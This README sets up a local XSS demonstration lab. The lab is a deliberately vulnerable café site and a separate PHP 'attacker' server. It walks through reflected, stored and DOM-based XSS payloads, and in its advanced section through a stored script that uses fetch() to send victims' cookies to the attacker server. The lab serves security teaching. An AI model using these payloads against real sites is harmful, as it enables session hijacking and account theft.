# ReadMe

## Setup

Steps to setup the environment.

> [!WARNING]
> Prerequisites: Download XAMPP  

### Setup MySQL (Running on port 8080)

- Start the Database Server on the XAMPP

- Go to `MySQL` 
  ```bash
  http://localhost:8080/phpmyadmin/
  ```
- Create the database
	- Database name: `db_745`
	- Table name: `reviews`
	- Fields: `Users`, `Comments`, `id`
	![picture 1](images/318ae36c81032737bc4e21d6887d339cc54bb4d3339f7bf3b26ba974e4634cae.png)  

### Setup Cafe Server

- Put `cafe` files in the following structure
	```
	xampp/htdocs/cafe/
	│── assets/				# images
	│── admin.php			# admin login page
	│── db.php				# Database connection file  
	│── index.php			# Main café homepage  
	│── recommendation.php	# DOM-Based XSS demo (dynamic content)  
	│── review.php			# Stored XSS demo (user reviews)  
	│── search.php			# Reflected XSS demo (search bar)  
	└── style.css			# Styling for the website  
	```
- Start the Web Server

- Go to the `cafe` website
  ```bash
  http://localhost:8080/cafe
  ```

### Setup Attacker's Server (Running on port 8000)

- Put attack file in the following structure
	```
	xampp/htdocs/attacker/
	│── log.txt				# stolen information (cookies)
	└── style.css			# stealer code
	```

- Run the attacker server using php
	- Go to the attacker's working directory `xampp/htdocs/attacker/`
	- Open a powershell from here and run the following command
		```bash
 		C:/xampp/php/php -S 127.0.0.1:8000
		```
## Attack

Steps to attack the vulnerable websites

### **Reflected XSS**

The `search` page is vulnerable to `Refected XSS`.

Type in the following command to the search bar to execute an alert. The alert can  be replaced with more dangerous command.

```bash
<script>alert('XSS Attack!')</script>
```
![picture 2](images/7d29d04860bf17db24653480736e11b224aa69a063a02d46879812ec47cb5dd4.png)  

Command got executed.

![picture 3](images/7722ccbf59ac191c660bd78a90bb18756de9944e17aa55ba9e5c5a62fe003ea3.png)  


### **Stored XSS**

The `Review` page is vulnerable to `Stored XSS`.

Type in the following information to the respective fields to trigger an alert.
	- Username: Attacker
	- Review: <script>alert('Hacked!')</script>

```bash
<script>alert('Hacked!')</script>
```

![picture 4](images/8fdd29afff14ae78715405f81d6d40ef9cc8c8b44bfb4cfce7f130c1b2833451.png)  

Command got executed.

![picture 5](images/8fb52f44749eab45020e93876f5ef2a6bdab5e8f83876585ab4c98768615b213.png)  

### **DOM-based XSS**

The `Recommendations` page is vulnerable to `DOM-based XSS`.

Type the following information to the searchbox to trigger an alert.

```bash
<img src=x onerror="alert('XSS Attack')">
```
![picture 7](images/0503aa4ab076abe69a770889a50877de9344dd1261ca48a940b1e6ae64d9760d.png)  

Command got executed.

![picture 8](images/edfa812d518fb90f88ac9437445408755ccd0083132e43aeb83dfb74ef796fa5.png)  

## Advanced Attack

> [!WARNING]
> For this attack to succeed, the attacker php server needs to be running.

In the previous examples, the just execute the alert.

In this section, we'll try to steal cookies (including user login cookie) from the `Review` page.

As an attacker, type the following input to the respective fields in the `Review` page.
	- Username: Attacker
	- Review: `<script> fetch('http://localhost:8000/steal.php?cookie=' + document.cookie); </script>`

![picture 9](images/459c41dd8d46cd6559aa018fe5d29b9c596b894e2210038b93d8a61fc6592dfa.png)  

Every time a user use this page, the cookies will be sent to the attacker's server in file `log.txt`

![picture 10](images/0ac942705ee67ff16ac01950db4af7d9a92e524daa93e3bdef6cb779daaa1b16.png)  

The cookies are stolen.

![picture 11](images/f5373aaf1146fda23ae35c680fea5046866fced15a33784240678d2a748f0b3f.png)  



